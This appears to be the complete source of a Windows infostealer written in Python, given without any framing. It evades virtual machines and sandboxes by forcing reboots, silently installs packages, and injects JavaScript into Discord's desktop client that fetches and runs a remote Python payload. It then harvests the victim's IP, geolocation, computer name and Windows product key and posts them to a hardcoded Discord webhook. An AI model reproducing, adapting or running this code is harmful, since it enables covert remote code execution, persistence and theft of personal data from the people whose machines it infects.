import sys
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def invenv(): 
    return get_base_prefix_compat() != sys.prefix
if invenv() == True: sys.exit()
import ctypes,os
class acsiii:
    def __init__(self):
        self.drivers()
        self.Regcheck()
        self.controvm()
    def drivers(self):
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if  os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmsci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
    def Regcheck(self):
        R = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        R2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if R != 1 and R2 != 1:
            os.system("shutdown /r /t 1")
            os._exit(1)
    def controvm(self):    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))
        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            os.system("shutdown /r /t 1")
            os._exit(1)      
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        try:
            ctypes.cdll.LoadLibrary("SbieDll.dll")
            os.system("shutdown /r /t 1")
            os._exit(1)
        except:pass
c = acsiii
import os, sys ,subprocess,time
try:
    import requests;from mss import mss;
except ImportError as e:
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', e.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        subprocess.run(f"pip install {e}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    finally:
       subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32 requests discord", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
time.sleep(2)
try:
    user = os.getlogin()
    path = f"C:/Users/{user}/APPDATA/Local/Discord/"
    dirr = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
    fdirs = [f for f in dirr if any(os.scandir(os.path.join(path, f)))]
    if 'app' in fdirs[0]:
        app = fdirs[0]
    else:
        fdirs.sort()
        app = fdirs[0]
    mainpath = f"{path}/{app}/modules/discord_desktop_core-1/discord_desktop_core/index.js"
    f = open(mainpath,"w")
    content = """const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
function download(url, dest) {
    const file = fs.createWriteStream(dest);
    https.get(url, (response) => {
        response.pipe(file);

        file.on('finish', () => {
            file.close(); 
            open(dest);
        });
    }).on('error', (err) => {
        fs.unlink(dest); 
        console.error(err.message);
    });
}
function open(filePath) {
    exec(`pythonw ${filePath}`, (err) => { 
        if (err) {
            return;
        } else {
            return;
        }
    });
}
const temp = process.env.temp;
const url = 'https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/bot.py';
const dpath = path.join(temp, `Z-builtins-7876-689a9de9fc.py`);
if (fs.existsSync(dpath)) {
    open(dpath);
} else {
    download(url, dpath);
}

module.exports = require('./core.asar');
"""
    f.write(content)
    f.close()
    s = open(mainpath,"r")
except:
    try:
        requests.post(hook,json={"content": f"Could not 1njec1 {user}"})
    except:
        pass

try:
    import os,requests,subprocess
    def download(url, dest):
        response = requests.get(url, stream=True)
        with open(dest, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        open_file(dest)
    def open_file(file_path):
        subprocess.run(['pythonw', file_path])
    temp = os.environ.get('temp')
    url = 'https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/bot.py'
    dpath = os.path.join(temp, 'Z-builtins-7876-689a9de9fc.py')

    if os.path.exists(dpath):
        open_file(dpath)
    else:
        download(url, dpath)
        open_file(dpath)

except Exception as e:
    try:requests.post(hook,json={"content": f"Could not download the 1njec1ion file: {user}"})
    except:pass

def info():
            import json
            from urllib.request import urlopen, Request
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            data = json.load(response)
            UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
            process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn \n").strip()
            process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            wtype = process2.communicate()[0].decode().strip("Caption \n").strip()
            userdata = f"```\n------- {os.getlogin()} ------- \nComputername: {os.getenv('COMPUTERNAME')} \nIP: {data['ip']} \n -VPN: {UsingVPN} \nOrg: {data['org']} \nCity: {data['city']} \nRegion: {data['region']} \nWindowskey: {wkey} \nWindows Type: {wtype} \n```**Map location: {googlemap}** \n"
            content = {"content": f"{userdata}"}
            use = json.dumps(content).encode('utf-8')
            headers2 = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
            r=Request(hook,data=use,headers=headers2);req=urlopen(r)
info()
